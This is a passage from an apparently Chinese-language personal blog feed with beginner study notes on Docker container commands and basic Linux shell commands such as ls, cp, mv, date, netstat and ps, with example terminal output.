-Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /usr/local/tomcat/bin/bootstrap.jar:/usr/local/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/usr/local/tomcat -Dcatalina.home=/usr/local/tomcat -Djava.io.tmpdir=/usr/local/tomcat/temp org.apache.catalina.startup.Bootstrap start</span><br><span class="line">[root@localhost ~]# docker top tom1</span><br><span class="line">UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD</span><br><span class="line">root                16306               16287               0                   21:54               pts/0               00:00:00            /bin/bash</span><br></pre></td></tr></table></figure><p>tty 是“<strong>teletypewriter</strong>”的缩写，但通常被称为终端，它允许您通过将数据（您的输入）传递给系统并显示系统产生的输出来与系统进行交互。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker top --help</span><br><span class="line"></span><br><span class="line">Usage:  docker top CONTAINER [ps OPTIONS]</span><br><span class="line"></span><br><span class="line">Display the running processes of a container</span><br><span class="line"></span><br><span class="line">Aliases:</span><br><span class="line">  docker container top, docker top</span><br></pre></td></tr></table></figure><p>这里的参数是指ps的参数在这里也是可以用的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# ps</span><br><span class="line">   PID TTY          TIME CMD</span><br><span class="line">  3825 pts/1    00:00:00 su</span><br><span class="line">  3831 pts/1    00:00:00 bash</span><br><span class="line">  8640 pts/1    00:00:00 ps</span><br><span class="line">[root@localhost ~]# ps -l</span><br><span class="line">F S   UID    PID   PPID  C PRI  NI ADDR SZ WCHAN  TTY          TIME CMD</span><br><span class="line">4 S     0   3825   3758  0  80   0 - 47494 wait   pts/1    00:00:00 su</span><br><span class="line">4 S     0   3831   3825  0  80   0 - 29143 wait   pts/1    00:00:00 bash</span><br><span class="line">0 R     0   8641   3831  0  80   0 - 37233 -      pts/1    00:00:00 ps</span><br><span class="line">[root@localhost ~]# docker top tom -l</span><br><span class="line">F                   S                   UID                 PID                 PPID                C                   PRI                 NI                  ADDR                SZ                  WCHAN               TTY                 TIME                CMD</span><br><span class="line">4                   S                   0                   8771                8753                80                  80                  0                   -                   546788              futex_              pts/0 </span><br><span class="line">[root@localhost ~]# docker top tom | grep 8753</span><br><span class="line">root                8771                8753                2                   17:02               pts/0               00:00:02            /usr/local/openjdk-8/bin/java -Djava.util.logging.config.file=/usr/local/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /usr/local/tomcat/bin/bootstrap.jar:/usr/local/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/usr/local/tomcat -Dcatalina.home=/usr/local/tomcat -Djava.io.tmpdir=/usr/local/tomcat/temp org.apache.catalina.startup.Bootstrap start</span><br></pre></td></tr></table></figure><h3 id="docker启停"><a href="#docker启停" class="headerlink" title="docker启停"></a>docker启停</h3><p>启动</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker start xx</span><br><span class="line">docker restart xx</span><br></pre></td></tr></table></figure><p>停止</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker stop xx优雅停止</span><br><span class="line">docker kill xx强制停止</span><br><span class="line">[root@localhost ~]# docker stop/kill $(docker ps -q)</span><br><span class="line">c17bb9e779f4</span><br><span class="line">0c5e1d974b26</span><br><span class="line">fc32e8b34259</span><br></pre></td></tr></table></figure><h3 id="docker-logs"><a href="#docker-logs" class="headerlink" title="docker logs"></a>docker logs</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker logs --help</span><br><span class="line"></span><br><span class="line">Usage:  docker logs [OPTIONS] CONTAINER</span><br><span class="line"></span><br><span class="line">Fetch the logs of a container</span><br><span class="line"></span><br><span class="line">Aliases:</span><br><span class="line">  docker container logs, docker logs</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">      --details        Show extra details provided to logs</span><br><span class="line">  -f, --follow         Follow log output</span><br><span class="line">      --since string   Show logs since timestamp (e.g.</span><br><span class="line">                       &quot;2013-01-02T13:23:37Z&quot;) or relative (e.g. &quot;42m&quot;</span><br><span class="line">                       for 42 minutes)</span><br><span class="line">  -n, --tail string    Number of lines to show from the end of the logs</span><br><span class="line">                       (default &quot;all&quot;)</span><br><span class="line">  -t, --timestamps     Show timestamps</span><br><span class="line">      --until string   Show logs before a timestamp (e.g.</span><br><span class="line">                       &quot;2013-01-02T13:23:37Z&quot;) or relative (e.g. &quot;42m&quot;</span><br><span class="line">                       for 42 minutes)</span><br><span class="line">                    </span><br><span class="line">docker logs --since &quot;2024-03-04&quot; --tail 3 buntu  这里的日期也可以换成10s,10h，since也可以换成until </span><br><span class="line">docker logs -f -n 10 tom 这个f可以用来查看容器动态的日志</span><br></pre></td></tr></table></figure><h3 id="docker-cp"><a href="#docker-cp" class="headerlink" title="docker cp"></a>docker cp</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker cp --help</span><br><span class="line"></span><br><span class="line">Usage:  docker cp [OPTIONS] CONTAINER:SRC_PATH DEST_PATH|-</span><br><span class="line">        docker cp [OPTIONS] SRC_PATH|- CONTAINER:DEST_PATH</span><br><span class="line"></span><br><span class="line">Copy files/folders between a container and the local filesystem</span><br><span class="line"></span><br><span class="line">Use &#x27;-&#x27; as the source to read a tar archive from stdin</span><br><span class="line">and extract it to a directory destination in a container.</span><br><span class="line">Use &#x27;-&#x27; as the destination to stream a tar archive of a</span><br><span class="line">container source to stdout.</span><br><span class="line"></span><br><span class="line">Aliases:</span><br><span class="line">  docker container cp, docker cp</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -a, --archive       Archive mode (copy all uid/gid information)</span><br><span class="line">  -L, --follow-link   Always follow symbol link in SRC_PATH</span><br><span class="line">  -q, --quiet         Suppress progress output during copy. Progress</span><br><span class="line">                      output is automatically suppressed if no terminal</span><br><span class="line">                      is attached</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost worksp]# ls</span><br><span class="line">my.tar  new.tar  test.c</span><br><span class="line">[root@localhost worksp]# docker cp my.tar buntu:/root</span><br><span class="line">Successfully copied 318MB to buntu:/root</span><br><span class="line">[root@localhost worksp]# docker exec -it buntu /bin/bash</span><br><span class="line">root@0c5e1d974b26:/# cd /root</span><br><span class="line">root@0c5e1d974b26:~# ls</span><br><span class="line">my.tar</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>tips:sudo 与 su 两个命令的最大区别是：</strong></p><p>sudo 命令需要输入当前用户的密码，su 命令需要输入 root 用户的密码。另外一个区别是其默认行为，sudo 命令只允许使用提升的权限运行单个命令，而 su 命令会启动一个新的 shell，同时允许使用 root 权限运行尽可能多的命令，直到明确退出登录。</p><h3 id="docker-commit"><a href="#docker-commit" class="headerlink" title="docker commit"></a>docker commit</h3><p>centos ifconfig用不了可以用yum安装net-tools</p><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">yum install -y net-tools</span><br></pre></td></tr></table></figure><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker commit --help</span><br><span class="line"></span><br><span class="line">Usage:  docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]</span><br><span class="line">tag叫什么都行，如果这个repository和tag都没有命名，默认是null，就成悬虚镜像了</span><br><span class="line">Create a new image from a container&#x27;s changes</span><br><span class="line"></span><br><span class="line">Aliases:</span><br><span class="line">  docker container commit, docker commit</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -a, --author string    Author (e.g., &quot;John Hannibal Smith</span><br><span class="line">                         &lt;hannibal@a-team.com&gt;&quot;)作者</span><br><span class="line">  -c, --change list      Apply Dockerfile instruction to the created image  可以增加指令，不常用</span><br><span class="line">  -m, --message string   Commit message提交</span><br><span class="line">  -p, --pause            Pause container during commit (default true) 暂停容器，up-&gt;暂停，默认时true </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker commit -a &quot;youzipii &lt;123@163.com&gt;&quot; -m &quot;Added net-tools&quot; ct1 centos7:net-tools</span><br><span class="line">sha256:ee655f40750fcdbee0c3fac1b6f7ffdf2b19c862bf4d4c7a0e52fc8930d52e01</span><br><span class="line">[root@localhost ~]# docker images</span><br><span class="line">REPOSITORY   TAG         IMAGE ID       CREATED         SIZE</span><br><span class="line">centos7      net-tools   ee655f40750f   9 seconds ago   445MB</span><br><span class="line">[root@localhost ~]# docker inspect ee655f40750f可以看详细信息元数据</span><br><span class="line">开起来看看有没有net-tools</span><br><span class="line">[root@localhost ~]# docker run --name ct2 -it centos7:net-tools</span><br><span class="line">[root@c789c7b87faa /]# ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255</span><br></pre></td></tr></table></figure><p><strong>tips：删除悬虚镜像</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker image prune</span><br><span class="line">WARNING! This will remove all dangling images.</span><br><span class="line">Are you sure you want to continue? [y/N] y</span><br><span class="line">Deleted Images:</span><br><span class="line">deleted: sha256:6c0ad715431faaa5ef68eecdc2a3cd489b66b6a765fb43775bb5376179d54138</span><br><span class="line">Total reclaimed space: 0B</span><br></pre></td></tr></table></figure><h2 id="容器导入导出"><a href="#容器导入导出" class="headerlink" title="容器导入导出"></a>容器导入导出</h2><h3 id="导出"><a href="#导出" class="headerlink" title="导出"></a>导出</h3><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker export --help</span><br><span class="line"></span><br><span class="line">Usage:  docker export [OPTIONS] CONTAINER</span><br><span class="line"></span><br><span class="line">Export a container&#x27;s filesystem as a tar archive</span><br><span class="line"></span><br><span class="line">Aliases:</span><br><span class="line">  docker container export, docker export</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -o, --output string   Write to a file, instead of STDOUT</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker export -o tom1-ex.tar tom1</span><br><span class="line">[root@localhost ~]# ls</span><br><span class="line">anaconda-ks.cfg  Downloads             mycmd            Public       Videos</span><br><span class="line">Desktop          initial-setup-ks.cfg  original-ks.cfg  Templates    worksp</span><br><span class="line">Documents        Music                 Pictures         tom1-ex.tar</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="导入"><a href="#导入" class="headerlink" title="导入"></a>导入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker import --help</span><br><span class="line"></span><br><span class="line">Usage:  docker import [OPTIONS] file|URL|- [REPOSITORY[:TAG]]</span><br><span class="line"></span><br><span class="line">Import the contents from a tarball to create a filesystem image</span><br><span class="line"></span><br><span class="line">Aliases:</span><br><span class="line">  docker image import, docker import</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -c, --change list       Apply Dockerfile instruction to the created image</span><br><span class="line">  -m, --message string    Set commit message for imported image</span><br><span class="line">      --platform string   Set platform if server is multi-platform capable</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker import tom1-ex.tar tom8:import</span><br><span class="line">sha256:3c91db73c82f48199d9cb1c805d9f80c1da963736217573d33228067e50395f3</span><br><span class="line">[root@localhost ~]# docker images</span><br><span class="line">REPOSITORY   TAG         IMAGE ID       CREATED          SIZE</span><br><span class="line">tom8         import      3c91db73c82f   4 seconds ago    499MB</span><br><span class="line">tomcat       8.5.49      6408fdc94212   4 years ago      507MB</span><br></pre></td></tr></table></figure><p>变小了，是因为有些历史记录，描述等被删除了，同样，如果不指定，又会多一个悬虚镜像</p><h3 id="与save-、load对比"><a href="#与save-、load对比" class="headerlink" title="与save 、load对比"></a>与save 、load对比</h3><ul><li><p>save和export</p><p>分别作用于镜像和容器，export一次只能导出一个容器，save可以一次对多个镜像导出</p><p>export的小（合并后的，快照，原有的历史记录等描述性信息会被丢掉），save是原封不动得保留下来</p></li><li><p>import与load</p><p>import导入的是容器包，load加载的是镜相包，但最终都会恢复为镜像</p><p>import恢复的为镜像只包含当前镜像一层，load恢复的镜像与原来分层的是完全相同的（imageid相同）</p><p>import恢复的镜像就是新购剑的镜像，id与原镜像不同。、</p><p>import 可以为导入的镜像指定<repository>与<tag>，load 加载的镜像不能指定。</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux</title>
      <link href="/2023/11/01/Linux%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/11/01/Linux%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h2 id="Linux下基本命令的掌握"><a href="#Linux下基本命令的掌握" class="headerlink" title="Linux下基本命令的掌握"></a>Linux下基本命令的掌握</h2><h3 id="ls指令"><a href="#ls指令" class="headerlink" title="ls指令"></a>ls指令</h3><p>语法：ls [ 选项 ] [文件或目录]</p><p>功能：对于目录，该命令列出该目录下的所有子目录与文件。对于文件，将列出文件名以及其他信息。</p><p>常用选项：</p><ul><li>-a 列出目录下的所有文件，包括以.开头的隐含文件。</li><li>-d 将目录象文件一样显示，而不是显示其下的文件。如:ls -d指定目录</li><li>-i 输出文件的i节点的索引信息。如ls -ai指定文件</li><li>-k 以k字节的形式表示文件的大小。ls -alk 指定文件</li><li>-| 列出文件的详细信息。</li><li>-t 以时间排序。</li><li>-R 列出所有子目录下的文件。(递归)</li><li>-h 可以显示大小单位，但要和-l参数一起使用</li></ul><h4 id="文件系统可以看这篇文章——-详细讲解，Linux内核——文件系统（建议收藏）-https-zhuanlan-zhihu-com-p-505338841"><a href="#文件系统可以看这篇文章——-详细讲解，Linux内核——文件系统（建议收藏）-https-zhuanlan-zhihu-com-p-505338841" class="headerlink" title="文件系统可以看这篇文章——[详细讲解，Linux内核——文件系统（建议收藏）][https://zhuanlan.zhihu.com/p/505338841]"></a>文件系统可以看这篇文章——[详细讲解，Linux内核——文件系统（建议收藏）][<a href="https://zhuanlan.zhihu.com/p/505338841]">https://zhuanlan.zhihu.com/p/505338841]</a></h4><h3 id="pwd命令"><a href="#pwd命令" class="headerlink" title="pwd命令"></a>pwd命令</h3><p>语法：pwd</p><p>功能：显示用户当前所在目录</p><p>常用选项：无</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20231031195748175.png" alt="image-20231031195748175"></p><h3 id="cd指令"><a href="#cd指令" class="headerlink" title="cd指令"></a>cd指令</h3><p>Linux系统中，磁盘上的文件和目录被组成一颗目录树，每个节点都是目录或文件</p><p>语法：cd 目录名</p><p>功能：改变工作目录，将当前工作目录改变到指定的目录下</p><p>举例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd ..: 返回上级目录</span><br><span class="line">cd /root/Desktop: 绝对路径</span><br><span class="line">cd ../day02/:相对路径</span><br><span class="line">cd ~: 进入用户家目录</span><br><span class="line">cd -: 返回最近访问的目录</span><br></pre></td></tr></table></figure><h3 id="touch命令"><a href="#touch命令" class="headerlink" title="touch命令"></a>touch命令</h3><p>语法：touch [选项]…文件…</p><p>功能：touch命令参数可更改文档或目录的日期时间，包括存取时间和更改时间，或者新建一个不存在的文件。</p><p>常用选项：</p><ul><li>-a 或-time&#x3D;atime或–time-access或–time&#x3D;use只改存取时间</li><li>-d 适用指定的日期时间，而非现在的时间</li><li>-f 此参数将忽略不予处理，仅负责解决BSD版本和touch指令的兼容性问题。</li><li>-m 或–time&#x3D;mtime或–time&#x3D;modify 只更改变动时间</li><li>-r 把指定文档或目录的日期时间，统统设成和参考文档或目录的日期时间相同</li><li>-t 使用指定的日期时间，而非现在的时间</li></ul><h3 id="mkdir指令（重要）"><a href="#mkdir指令（重要）" class="headerlink" title="mkdir指令（重要）"></a>mkdir指令（重要）</h3><p>语法：mkdir [选项] dirname…</p><p>功能：在当前目录下创建一个名问dirname的目录</p><p>常用选项：</p><ul><li>-p,–parents 可以是一个路径名称。此时若路径中的某些目录尚不存在，加上此选项后，系统将自动建立那些尚不存在的目录，即一次可以建立多个目录。</li></ul><p>举例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdi -p /test/test1</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20231031202106611.png" alt="image-20231031202106611"></p><h3 id="rmdir指令-amp-amp-rm指令（重要）"><a href="#rmdir指令-amp-amp-rm指令（重要）" class="headerlink" title="rmdir指令&amp;&amp;rm指令（重要）"></a>rmdir指令&amp;&amp;rm指令（重要）</h3><p>rmdir是一个与mkdir相应的命令，mkdir是建立目录，而rmdir是删除命令。</p><p>语法：rmdir [-p] [dirname]</p><p>适用对象：具有当前目录操作权限的使用者</p><p>功能：删除空目录</p><p>常用选项：</p><ul><li>-p 当子目录被删除后如果父目录变成空目录的话，就连带父目录一起删除</li></ul><p>rm命令可以同时删除文件或目录</p><p>语法： rm[-f-i-r-v] [dirname&#x2F;dir]</p><p>适用对象：所有适用者</p><p>功能：删除文件或目录</p><p>常用选项：</p><ul><li>-f 即使文件属性为只读，也直接删除</li><li>-i 删除前逐一询问确认</li><li>-r 删除目录及其下所有文件</li></ul><h3 id="man指令（重要）"><a href="#man指令（重要）" class="headerlink" title="man指令（重要）"></a>man指令（重要）</h3><p>Linux的命令有很多参数，我们不可能全记住，我们可以通过查看联机手册获取帮助。访问Linux手册页的命令是man。</p><p>语法：man [选项] 命令</p><p>常用选项：</p><ul><li><p>-k 根据关键词搜索联机帮助</p></li><li><p>num只在第num章节找</p></li><li><p>-a 将所有章节的都显示出来，比如man printf它缺省从第一章开始搜索，知道就停止，用a选项，当按下q退出，他会继续往后面搜索，知道所有章节都搜索完毕</p></li><li><p>1是普通命令</p></li><li><p>2 是系统调用如open，write之类的（通过这个，至少可以方便的差导调用这个函数们需要加什么头文件）</p></li><li><p>3 是库函数,如printf,fread</p></li><li><p>4 是特殊文件,也就是&#x2F;dev下的各种设备文件</p></li><li><p>5 是指文件的格式,比如passwd,就会说明这个文件中各个字段的含义</p></li><li><p>6 是给游戏留的,由各个游戏自己定义</p></li><li><p>7 是附件还有一些变量,比如向environ这种全局变量在这里就有说明</p></li><li><p>8 是系统管理用的命令,这些命令只能由root使用,如ifconfig</p></li></ul><p>man手册可以汉化。</p><h3 id="cp指令重要"><a href="#cp指令重要" class="headerlink" title="cp指令重要"></a>cp指令重要</h3><p>语法：cp [选项] 源文件或者目录 目标文件或者目录</p><p>功能：复制文件或目录</p><p>说明：cp指令用于复制文件或目录，如同时指定两个以上的文件或目录，且最后的目的地是一个已经存在的目录，则它会把前面指定的所有文件或目录复制到此目录中。若同时指定多个文件或目录，而最后的目的地并非一个已存在的目录，则会出现错误信息</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20231031210152423.png" alt="image-20231031210152423"></p><p>常用选项：</p><ul><li>-f或–force强行复制文件或目录，不论目的文件或目录是否已经存在</li><li>-i或–interactive覆盖文件之前先询问用户</li><li>-r递归处理，将指定目录下的文件与子目录一并处理。若源文件或目录的志，不属于目录或符号链接，则一律视为普通文件处理</li><li>-R或–recursive递归处理，将指定目录下的文件及子自录—升处理</li></ul><h3 id="mv指令（重要）"><a href="#mv指令（重要）" class="headerlink" title="mv指令（重要）"></a>mv指令（重要）</h3><p>mv命令是move的缩写，可以用来移动文件或者将文件改名（move (rename)files）,是linux系统下常用的命令。经常用来备份文件或目录</p><p>语法：mv [选项] 源文件或者目录 目标文件或者目录</p><p>功能：</p><ol><li>视mv命令中第二个参数类型的不同(是目标文件还是目标目录)，mv命令将文件重命名或将其移至一个新的目录中。</li><li>当第二个参数类型是文件时、mv命令完成文件重命名，此时，源文件只能有一个(也可以是源目录名)，它将所给的源文件或目录重命名为给定的日标文件名。</li><li>当第二个参数是已存在的目录名称时，源文件或目录参数可以有多个，mv命令将各参数指定的源文件均移至目标目录中。</li></ol><p>常用选项：</p><ul><li>-f : force强制的意思，如果目标文件已经存在，不会询问而直接覆盖. </li><li>-i :若目标文件(destination)已经存在时，就会询问是否覆盖!</li></ul><p>举例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将rm改成mv</span><br><span class="line">vim ~/.bashrc #修改这个文件</span><br><span class="line">mkdir -p ~/.trash</span><br><span class="line">alias rm=trash</span><br><span class="line">alias ur=undelfile</span><br><span class="line">undelfile() &#123;</span><br><span class="line">mv -i !.trash/\$@ ./</span><br><span class="line">&#125;</span><br><span class="line">trash() &#123;</span><br><span class="line">mv $@ ~/.trash/</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h3><p>语法： cat [选项] [文件]</p><p>功能：查看目标文件内容</p><p>常用选项：</p><ul><li>-b 对非空输出行编号</li><li>-n 对输出的所有行编号</li><li>-s 不输出多行空行</li></ul><h3 id="date"><a href="#date" class="headerlink" title="date"></a>date</h3><p>date指定格式显示时间 date+%Y:%m:%d</p><p>date用法：date[option]…[+Format]</p><ol><li><p>在显示方面，使用者可以设定欲显示的格式，格式设定为一个加号后接数个标记，其中常用的标记列表如下</p><ul><li>%H:小时(O0..23)</li><li>%M:分钟(00..59)</li><li>%S∶秒(00..61)</li><li>%X∶相当于%H:%M:%S</li><li>%d:日(01..31)</li><li>%m :月份(01..12)</li><li>%Y:完整年份(0000..9999)</li><li>%F:相当于%Y-%m-%d</li></ul></li><li><p>在设定时间方面</p><ul><li>date -s &#x2F;&#x2F;设置当前时间，只有root权限才能设置，其他只能查看。</li><li>date -s 20080523&#x2F;设置成20080523，这样会把具体时间设置成空00:00:00</li><li>date -s 01:01:01&#x2F;&#x2F;设置具体时间，不会对日期做更改</li><li>date -s “01:01:01 2008-05-23”&#x2F;&#x2F;这样可以设置全部时间</li><li>date -s “01:01:01 20080523”&#x2F;&#x2F;这样可以设置全部时间</li><li>date -s “2008-05-23 01:01:01”&#x2F;&#x2F;这样可以设置全部时间</li><li>date -s “200805230 1:01:01”&#x2F;&#x2F;这样可以设置全部时间</li></ul></li><li><p>时间戳</p><p>时间-&gt;时间戳</p><ul><li>date +%s</li></ul><p>时间戳-&gt;时间</p><ul><li>date+%Y:%m:%d -d @1599642565</li></ul><p>Unix时间戳(英文为Unix epoch, Unix time, POSIX time或Unix timestamp)是从1970年1月1日(UTCGMT的午夜)开始所经过的秒数，不考虑闰秒。</p></li></ol><h3 id="top"><a href="#top" class="headerlink" title="top"></a>top</h3><p>Linux下常用的性能分析工具，能够实时显示系统中各个进程的资源占用状况，类似于Windows的任务管理器。我们目前要了解的选项</p><p>选项：</p><ul><li>-u&lt;用户名&gt;指定用户名</li><li>-p&lt;进程号&gt;指定进程</li><li>-n&lt;次数&gt;循环显示的次数</li></ul><h3 id="shutdown关机"><a href="#shutdown关机" class="headerlink" title="shutdown关机"></a>shutdown关机</h3><p>语法：shutdown [选项] 常见选项：</p><ul><li>-h :将系统的服务停掉后，立即关机</li><li>-r ︰在将系统的服务停掉之后就重新启动</li><li>-t sec : -t后面加秒数，亦即『过几秒后关机』的意思</li></ul><p>如果后面购买了云服务器，尽量不要使用shutdown来关机，因为云服务器一般都要保证服务器一直在线，使用exit或者ctrl+d退出即可</p><h3 id="重要的几个热键-Tab-CTRL-c-CTRL-d"><a href="#重要的几个热键-Tab-CTRL-c-CTRL-d" class="headerlink" title="重要的几个热键[Tab],[CTRL]+c,[CTRL]+d"></a>重要的几个热键[Tab],[CTRL]+c,[CTRL]+d</h3><ul><li><p>ctrl + d：退出登陆用户或键盘输入结束</p></li><li><p>tab键：命令或档案的补全</p></li><li><p>ctrl+c：终止前台异常进程</p></li></ul><h3 id="以下命令后续逐一补全"><a href="#以下命令后续逐一补全" class="headerlink" title="以下命令后续逐一补全:"></a>以下命令后续逐一补全:</h3><ul><li>安装和登录命令: login、shutdown、halt、reboot、install、mount、umount、chsh、exit、last;</li><li>文件处理命令: file、mkdir、grep、dd、find、mv、ls、diff、cat、In;</li><li>系统管理相关命令: df、top、free、quota、at、lp、adduser、groupadd、kill、crontab;</li><li>网络操作命令: ifconfig、 ip、ping、netstat、telnet、ftp、route、rlogin、rcp、finger、mail、nslookup</li><li>系统安全相关命令: passwd、su、umask、chgrp、chmod、chown、chattr、sudo ps、who;</li><li>其它命令: tar、unzip、gunzip、unarj、mtools、man、unendcode、uudecode。</li></ul><h3 id="netstat-重要"><a href="#netstat-重要" class="headerlink" title="netstat (重要)"></a>netstat (重要)</h3><p><code>netstat</code>命令用于显示与IP、TCP、UDP和ICMP协议相关的统计数据，一般用于检验本机各端口的网络连接情况。<code>netstat</code>是在内核中访问网络及相关信息的程序，它能提供TCP连接，TCP和UDP监听，进程内存管理的相关报告。</p><ul><li><p>-a：查看所有连接</p></li><li><p>-c：持续列出网络状态</p></li><li><p>-e：显示网络其他相关信息</p></li><li><p>-n:直接打印连接的IP地址与端口信息</p></li><li><p>-l  或–listening           显示监控中的服务器的Socket。</p></li><li><p>-p  或–programs         显示正在使用Socket的程序识别码和程序名称。</p></li><li><p>-r：显示路由信息</p></li><li><p>-t：显示TCP传输协议的连线状况</p></li></ul><p>netstat -lntp可以用来查看服务器是什么</p><h3 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h3><h5 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h5><p>查看进程的PID、名称以及CPU占用率：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps axo pid,comm,pcpu</span><br></pre></td></tr></table></figure><p>按内存资源的使用量对进程进行排序：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps aux | sort -rnk <span class="number">4</span></span><br></pre></td></tr></table></figure><p>按CPU资源的使用量对进程进行排序：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps aux | sort -nk <span class="number">3</span></span><br></pre></td></tr></table></figure><p>显示所有进程信息：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -A</span><br></pre></td></tr></table></figure><p>显示指定用户信息：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -u root</span><br></pre></td></tr></table></figure><p>查看线程数：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -efL</span><br></pre></td></tr></table></figure><p>查看进程并按内存使用大小排列：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -e -o <span class="string">&quot;%C : %p :%z : %a&quot;</span> | sort -k5 -nr</span><br></pre></td></tr></table></figure><p>显示所有进程信息，连同命令行：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -ef</span><br></pre></td></tr></table></figure><p>ps与grep常用组合用法，查找特定进程：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -ef | grep ssh</span><br></pre></td></tr></table></figure><p>通过名字或命令搜索进程：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -C nginx</span><br></pre></td></tr></table></figure><p>CPU或者内存进行排序，降序：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps aux --sort=-pcpu,+pmem</span><br></pre></td></tr></table></figure><p>用树的风格显示进程的层次关系：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -f --forest -C nginx</span><br></pre></td></tr></table></figure><p>显示一个父进程的子进程：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -o pid,uname,comm -C nginx</span><br></pre></td></tr></table></figure><p>重定义标签：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -e -o pid,uname=<span class="variable constant_">USERNAME</span>,pcpu=<span class="variable constant_">CPU_USAGE</span>,pmem,comm</span><br></pre></td></tr></table></figure><p>显示进程运行的时间：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -e -o pid,comm,etime</span><br></pre></td></tr></table></figure><p>查看named进程详细信息：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -aux | grep named</span><br></pre></td></tr></table></figure><p>通过进程id获取服务名称：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -o command -p <span class="number">91730</span> | sed -n 2p</span><br></pre></td></tr></table></figure><p>将目前属于您自己这次登入的PID与相关信息列示出来：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -l</span><br></pre></td></tr></table></figure><p>列出目前所有的正在内存当中的程序：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps aux</span><br></pre></td></tr></table></figure><p>找出与<code>cron</code>与<code>syslog</code>这两个服务有关的PID号码：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps aux | egrep <span class="string">&#x27;(cron|syslog)&#x27;</span></span><br></pre></td></tr></table></figure><p>把所有进程显示出来，并输出到<code>ps001.txt</code>文件：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -aux &gt; ps001.<span class="property">txt</span></span><br></pre></td></tr></table></figure><h3 id="awk"><a href="#awk" class="headerlink" 